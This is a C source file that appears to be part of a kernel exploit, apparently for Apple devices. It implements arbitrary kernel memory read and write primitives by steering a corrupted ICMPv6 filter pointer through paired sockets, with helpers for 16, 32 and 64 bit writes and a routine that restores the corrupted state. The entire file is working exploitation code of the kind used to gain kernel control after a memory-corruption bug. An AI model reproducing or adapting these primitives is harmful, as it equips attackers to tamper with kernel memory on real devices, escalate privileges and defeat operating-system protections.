#include "krw.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <pthread.h>
#include <string.h>
#include <sys/socket.h>

static pthread_mutex_t krw_lock = PTHREAD_MUTEX_INITIALIZER;

bool krw_is_kernel_address(uint64_t address) {
    return address != 0 && (address & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
}

static bool krw_range_valid(uint64_t address, size_t size) {
    return size > 0 && address + size - 1 >= address && krw_is_kernel_address(address) && krw_is_kernel_address(address + size - 1);
}

static bool repark_locked(void) {
    if (!g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0) return false;
    for (unsigned attempt = 0; attempt < 3; attempt++) {
        if (setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.rw_filter_snapshot, EARLY_KRW_LENGTH) != 0) {
            continue;
        }
        uint8_t readback[EARLY_KRW_LENGTH] = {};
        socklen_t length = sizeof(readback);
        if (getsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, readback, &length) == 0 && length >= EARLY_KRW_LENGTH && memcmp(readback, g_ctx.rw_filter_snapshot, EARLY_KRW_LENGTH) == 0) {
            return true;
        }
    }
    LOG_ERR("KRW repark could not be verified");
    g_ctx.transport_unsafe = true;
    return false;
}

static bool set_target_locked(uint64_t where) {
    uint8_t target[EARLY_KRW_LENGTH];
    memcpy(target, g_ctx.rw_filter_snapshot, sizeof(target));
    memcpy(target, &where, sizeof(where));
    if (setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, target, sizeof(target)) == 0) {
        return true;
    }
    LOG_ERR("KRW set target failed at %#llx: %s (%d)", where, strerror(errno), errno);
    return false;
}

bool early_kread_checked(uint64_t where, void* read_buf, size_t size) {
    if (read_buf == NULL || size > EARLY_KRW_LENGTH || !krw_range_valid(where, size) || !g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0 || g_ctx.rw_socket < 0) {
        if (read_buf != NULL && size > 0) memset(read_buf, 0, size);
        LOG_ERR("kread rejected at %#llx", where);
        return false;
    }

    pthread_mutex_lock(&krw_lock);
    bool targeted = set_target_locked(where);
    socklen_t length = (socklen_t)size;
    int result = targeted ? getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &length) : -1;
    int saved_errno = errno;
    bool parked = repark_locked();
    pthread_mutex_unlock(&krw_lock);

    if (!targeted || result != 0 || length < size || !parked) {
        memset(read_buf, 0, size);
        if (targeted && result != 0) {
            LOG_ERR("kread failed at %#llx: %s (%d)", where, strerror(saved_errno), saved_errno);
        }
        return false;
    }
    return true;
}

bool early_kread64_checked(uint64_t where, uint64_t* value) {
    if (value == NULL) return false;
    *value = 0;
    return early_kread_checked(where, value, sizeof(*value));
}

static bool early_kwrite32bytes_checked(uint64_t where, const void* write_buf) {
    if (write_buf == NULL || !krw_range_valid(where, EARLY_KRW_LENGTH) || !g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0 || g_ctx.rw_socket < 0) {
        LOG_ERR("kwrite rejected at %#llx", where);
        return false;
    }

    pthread_mutex_lock(&krw_lock);
    bool targeted = set_target_locked(where);
    int result = targeted ? setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH) : -1;
    int saved_errno = errno;
    bool parked = repark_locked();
    pthread_mutex_unlock(&krw_lock);

    if (!targeted || result != 0 || !parked) {
        if (targeted && result != 0) {
            LOG_ERR("kwrite failed at %#llx: %s (%d)", where, strerror(saved_errno), saved_errno);
        }
        return false;
    }
    return true;
}

bool early_kwrite_checked(uint64_t where, const void* what, size_t size) {
    if (what == NULL || size == 0 || size > EARLY_KRW_LENGTH) return false;
    uint8_t write_buf[EARLY_KRW_LENGTH];
    if (!early_kread_checked(where, write_buf, sizeof(write_buf))) return false;
    memcpy(write_buf, what, size);
    return early_kwrite32bytes_checked(where, write_buf);
}

bool early_kwrite16_checked(uint64_t where, uint16_t what) {
    return early_kwrite_checked(where, &what, sizeof(what));
}

bool early_kwrite32_checked(uint64_t where, uint32_t what) {
    return early_kwrite_checked(where, &what, sizeof(what));
}

bool early_kwrite64_checked(uint64_t where, uint64_t what) {
    return early_kwrite_checked(where, &what, sizeof(what));
}

bool krw_park_transport(void) {
    if (!g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0) return false;
    pthread_mutex_lock(&krw_lock);
    bool parked = repark_locked();
    pthread_mutex_unlock(&krw_lock);
    return parked;
}
